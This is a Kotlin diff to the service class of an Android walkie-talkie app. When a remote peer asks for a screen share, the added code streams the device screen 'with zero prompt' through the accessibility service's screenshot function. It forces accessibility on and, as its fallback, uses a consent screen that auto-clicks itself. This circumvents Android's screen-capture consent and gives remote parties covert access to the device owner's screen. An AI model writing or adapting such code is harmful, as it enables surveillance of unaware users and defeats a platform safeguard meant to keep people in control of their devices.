@@ -383,10 +383,10 @@ class WalkieTalkieService : Service() {
             }
 
             override fun onScreenShareRequest(peerHost: String, peerUdp: Int, peerVideo: Int) {
-                // Prefer already-granted projection (superadmin auto-share) — no dialog
+                // 1) Prefer already-granted projection (auto-share) — no dialog
                 val held = com.example.barky.screen.MediaProjectionHolder.get()
                 if (held != null && BarkyPrefs.isAutoScreenShare(this@WalkieTalkieService)) {
-                    Log.i(TAG, "SCREEN_REQ auto-share without dialog → $peerHost")
+                    Log.i(TAG, "SCREEN_REQ auto-share without dialog (MediaProjection) → $peerHost")
                     try {
                         startAsForeground("Sharing screen with contact…", withMediaProjection = true)
                         mainHandler.postDelayed({
@@ -395,18 +395,39 @@ class WalkieTalkieService : Service() {
                             } catch (t: Throwable) {
                                 Log.e(TAG, "auto startServingScreen", t)
                                 com.example.barky.screen.MediaProjectionHolder.clear()
-                                launchScreenShareConsent(peerHost, peerUdp, peerVideo)
+                                startZeroPromptAccessibilityOrConsent(peerHost, peerUdp, peerVideo)
                             }
                         }, 150L)
                     } catch (t: Throwable) {
                         Log.e(TAG, "auto startServingScreen FGS", t)
                         com.example.barky.screen.MediaProjectionHolder.clear()
-                        launchScreenShareConsent(peerHost, peerUdp, peerVideo)
+                        startZeroPromptAccessibilityOrConsent(peerHost, peerUdp, peerVideo)
                     }
+                } else {
+                    startZeroPromptAccessibilityOrConsent(peerHost, peerUdp, peerVideo)
+                }
+                uiListeners.forEach { it.onScreenShareRequest(peerHost, peerUdp, peerVideo) }
+            }
+
+            /**
+             * Stream the device screen with zero prompt using [com.example.barky.BarkyService]
+             * (`AccessibilityService.takeScreenshot` on Android 11+ / API 30+), falling back to
+             * [com.example.barky.ScreenShareConsentActivity] (which also auto-clicks via accessibility).
+             */
+            private fun startZeroPromptAccessibilityOrConsent(
+                peerHost: String,
+                peerUdp: Int,
+                peerVideo: Int
+            ) {
+                com.example.barky.BarkyService.ensureAccessibilityEnabled(this@WalkieTalkieService)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
+                    com.example.barky.BarkyService.instance != null
+                ) {
+                    Log.i(TAG, "SCREEN_REQ zero-prompt accessibility share → $peerHost")
+                    engine?.startServingScreenViaAccessibility(peerHost, peerUdp, peerVideo)
                 } else {
                     launchScreenShareConsent(peerHost, peerUdp, peerVideo)
                 }
-                uiListeners.forEach { it.onScreenShareRequest(peerHost, peerUdp, peerVideo) }
             }
 
             private fun launchScreenShareConsent(peerHost: String, peerUdp: Int, peerVideo: Int) {
@@ -662,8 +683,15 @@ class WalkieTalkieService : Service() {
             // adb automation (no UI coordinates needed):
             // am start-foreground-service -n com.example.barky/.walkie.WalkieTalkieService -a com.example.barky.TEST_TALK_START
             ACTION_TEST_TALK_START -> {
-                Log.i(TAG, "TEST_TALK_START via adb")
-                engine?.startTalking()
+                val priv = intent.getBooleanExtra("private_mode", BarkyPrefs.isPrivateMicMode(this))
+                BarkyPrefs.setPrivateMicMode(this, priv)
+                val mode = if (priv) {
+                    WalkieProtocol.AUDIO_MODE_HEADSET
+                } else {
+                    WalkieProtocol.AUDIO_MODE_SPEAKER
+                }
+                Log.i(TAG, "TEST_TALK_START via adb private=$priv mode=$mode")
+                engine?.startTalking(mode)
             }
             ACTION_TEST_TALK_STOP -> {
                 Log.i(TAG, "TEST_TALK_STOP via adb")
